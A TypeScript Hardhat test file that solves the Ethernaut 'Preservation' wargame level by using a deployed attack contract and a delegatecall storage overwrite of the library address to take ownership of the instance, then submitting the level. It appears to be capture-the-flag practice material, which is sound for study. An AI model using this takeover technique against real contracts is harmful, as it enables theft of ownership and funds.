import {ethers} from 'hardhat'
import {BigNumber, Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F'
const INSTANCE_ADDRESS = '0x5274127463Ce66f652ed11a6e23F0faC133E74E9'

describe('16 Preservation', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Preservation', INSTANCE_ADDRESS)

    const factory = await ethers.getContractFactory('PreservationAttack')
    attack = await factory.deploy()
    await attack.deployTransaction.wait()

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  it('overwrites timeZone1Library with attack contract address', async () => {
    const tx = await instance.setFirstTime(ethers.BigNumber.from(attack.address))
    await tx.wait()
    expect(await instance.timeZone1Library()).to.eq(attack.address)
  })

  it('calls setFirstTime on instance again', async () => {
    const tx = await instance.setFirstTime(0, {gasLimit: 100000})
    return expectStatusOK(tx)
  })

  it('verifies signer has become owner', async () => {
    expect(await instance.owner()).to.equal(signerAddress)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
